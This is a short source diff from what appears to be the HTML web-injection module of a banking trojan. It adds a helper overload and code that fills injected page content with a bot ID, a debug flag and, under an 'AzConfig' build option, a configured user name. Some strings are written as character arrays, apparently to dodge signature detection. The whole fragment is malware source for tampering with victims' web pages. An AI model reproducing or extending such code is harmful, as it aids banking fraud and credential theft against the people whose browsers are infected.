@@ -11,6 +11,7 @@
 #include "BotUtils.h"
 #include "Loader.h"
 #include "BotDef.h"
+#include "StrConsts.h"
 
 #include "Modules.h"
 
@@ -86,6 +87,11 @@ void HTMLInjectSetVariableValue(THTMLInjectData *Data, const char* Variable, con
 	Data->After.Replace(Variable, Value);
 }
 
+void inline HTMLInjectSetVariableValue(THTMLInjectData *Data, const string &Variable, const string &Value)
+{
+	HTMLInjectSetVariableValue(Data, Variable.t_str(), Value.t_str());
+}
+
 
 void HTMLInjectSetSystemVariables(THTMLInjectData *Data)
 {
@@ -96,6 +102,8 @@ void HTMLInjectSetSystemVariables(THTMLInjectData *Data)
     const static char VariableBotID[] = {'%', 'b', 'o', 't', '_', 'i', 'd', '%', 0};
     const static char VariableDebug[] = {'%','d','e','b','u','g','%', 0};
 
+
+
 	PCHAR BotID = GenerateBotID();
 	#ifdef DEBUGCONFIG
 	PCHAR IsDebug = "true";
@@ -105,7 +113,11 @@ void HTMLInjectSetSystemVariables(THTMLInjectData *Data)
 
 
 	HTMLInjectSetVariableValue(Data, VariableBotID, BotID);
-    HTMLInjectSetVariableValue(Data, VariableDebug, IsDebug);
+	HTMLInjectSetVariableValue(Data, VariableDebug, IsDebug);
+
+	#ifdef AzConfigH
+		HTMLInjectSetVariableValue(Data, GetStr(AzConfigParamUserName), GetAzUser());
+	#endif
 
 	STR::Free(BotID);
 }
